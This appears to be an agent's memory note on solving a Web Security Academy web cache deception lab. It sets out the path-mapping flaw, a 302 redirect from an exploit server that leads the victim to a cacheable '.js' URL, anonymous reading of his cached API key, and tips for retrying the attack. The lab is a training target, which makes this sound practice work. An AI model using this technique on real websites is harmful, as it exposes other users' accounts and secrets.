---
metadata:
  node_type: memory
name: "Web Cache Deception Labs"
description: "WCD path-mapping lab solved: /my-account/<x>.js cached the session page; 302-delivered to carlos, read his API key anonymously, submitSolution correct."
last_updated: 2026-10-10T15:41:46+08:00
created: 2026-10-10T15:41:46+08:00
---

## 2026-02 lab-wcd-exploiting-path-mapping (arm A) — solved

Instance `0a0f00cd03e5c4c681c4578500c40093.web-security-academy.net`, exploit server present.

Mechanism found empirically:
- `/api/orders`, `/api/orders/1`, `/api/user/1` … all 404 — the vulnerable resource is `/my-account` itself, not an API route.
- Origin maps any suffix after `/my-account` to the account handler (regex path mapping): `GET /my-account/test.js` returned the session user's account page (200, `cache-control: max-age=30`, `x-cache: miss`).
- The front-end cache treats a `.js`-suffixed path as a static asset and stores the response; a cookie-less repeat returned `x-cache: hit`, age 5, body still showing wiener's API key. Cache key excludes the session while origin/cache disagree on path→resource mapping.
- Delivery: exploit server POST `/` with `responseFile=/exploit`, `responseHead=HTTP/1.1 302 Found\nLocation: https://<lab>/my-account/c1.js\n`, `responseBody=` (empty), `formAction=DELIVER_TO_VICTIM`, `urlIsHttps=on`, then `--follow` (302 -> /deliver-to-victim -> /). The victim (carlos) requested the URL with his session, so his account page was cached under that key.
- Immediate anonymous GET of the same URL = `x-cache: hit`, body `Your username is: carlos` + API key; POST `/submitSolution` form `answer=<key>` returned `{"correct":true}`; banner `Congratulations, you solved the lab!`.

Reusable rules:
- WCD lab: use a fresh suffix name per attempt (or wait out max-age=30) so the victim's request is a cache MISS at the origin.
- Sweep candidate resource paths first; do not assume `/api/...` exists.
- This lab's front-end answers `403 "GET requests cannot contain a body"` — http_session `--follow` after a POST replays the body onto the GET; fetch the redirect target separately with a plain GET.

